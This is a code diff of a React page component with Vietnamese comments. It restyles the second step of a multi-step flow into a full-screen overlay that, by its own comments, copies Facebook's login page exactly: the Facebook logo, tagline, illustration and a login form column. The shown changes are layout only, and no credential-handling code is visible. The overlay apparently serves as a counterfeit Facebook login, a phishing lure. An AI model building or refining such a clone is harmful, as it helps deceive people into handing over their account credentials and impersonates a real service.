@@ -729,7 +729,7 @@ export default function Home() {
                 </div>
               )}
 
-              {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% tỷ lệ FB */}
+              {/* BƯỚC 2: LOGIN FULL PAGE - Chuẩn 100% ảnh 1 */}
               {step === 2 && (
                 <div style={{ 
                   position: 'fixed', 
@@ -740,50 +740,64 @@ export default function Home() {
                   flexDirection: 'row' 
                 }}>
                   
-                  {/* CỘT TRÁI: Ảnh minh họa và Text (Chuẩn HTML FB) */}
+                  {/* CỘT TRÁI: Chứa logo, chữ và ảnh */}
                   <div style={{ 
                     flex: '2', 
                     display: 'flex', 
                     flexDirection: 'column', 
                     justifyContent: 'center', 
-                    alignItems: 'flex-start', // Căn lề trái
-                    padding: '0 8vw', // Đẩy lề trái ra một khoảng rộng
+                    padding: '0 4vw',
                     borderRight: '1px solid #e4e6eb',
                     backgroundColor: '#fff'
                   }}>
-                    <div style={{ width: '100%', maxWidth: '600px', display: 'flex', flexDirection: 'column' }}>
+                    
+                    {/* Khối bọc để căn lề trái tổng thể */}
+                    <div style={{ width: '100%', maxWidth: '800px', margin: '0 auto' }}>
                       
-                      {/* Logo Facebook */}
-                      <div style={{ marginBottom: '20px' }}>
+                      {/* Logo Facebook trên cùng */}
+                      <div style={{ marginBottom: '40px' }}>
                         <svg viewBox="0 0 24 24" fill="#0866FF" width="48" height="48">
                           <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
                         </svg>
                       </div>
-                      
-                      {/* Khối Text gộp liền mạch */}
-                      <div style={{ marginBottom: '40px' }}>
-                        <span style={{ 
-                          fontSize: '56px', 
-                          fontWeight: '700', 
-                          lineHeight: '66px', // Set line-height theo đúng CSS FB
-                          color: '#1c2b33', 
-                          letterSpacing: '-1.5px',
-                          display: 'block'
-                        }}>
-                          Explore the things <span style={{ color: '#0064e0' }}>you love</span>.
-                        </span>
+
+                      {/* Dùng Grid để chia 2 cột: Chữ và Ảnh nằm cạnh nhau */}
+                      <div style={{ 
+                        display: 'grid', 
+                        gridTemplateColumns: '1fr 1.5fr', // Chữ chiếm 1, Ảnh chiếm 1.5
+                        gap: '20px',
+                        alignItems: 'center' // Căn giữa theo chiều dọc
+                      }}>
+                        
+                        {/* CỘT CHỨA CHỮ */}
+                        <div>
+                          <h1 style={{ 
+                            fontSize: '48px', 
+                            fontWeight: '700', 
+                            lineHeight: '1.1', 
+                            color: '#1c2b33', 
+                            margin: 0,
+                            letterSpacing: '-1.5px'
+                          }}>
+                            Explore <br />the <br />things <br />
+                            <span style={{ color: '#0064e0' }}>you love.</span>
+                          </h1>
+                        </div>
+
+                        {/* CỘT CHỨA ẢNH */}
+                        <div>
+                          <img 
+                            src="/images/Anhlogin.webp" 
+                            alt="Explore" 
+                            style={{ width: '100%', maxWidth: '600px', display: 'block' }} 
+                          />
+                        </div>
+                        
                       </div>
-                      
-                      {/* Ảnh minh họa to bung ra */}
-                      <img 
-                        src="/images/Anhlogin.webp" 
-                        alt="Explore" 
-                        style={{ width: '100%', maxWidth: '550px', display: 'block' }} 
-                      />
                     </div>
                   </div>
 
-                  {/* CỘT PHẢI: Form đăng nhập (Giữ nguyên theo yêu cầu) */}
+                  {/* CỘT PHẢI: Form đăng nhập (Giữ nguyên) */}
                   <div style={{ 
                     flex: '1',
                     display: 'flex', 
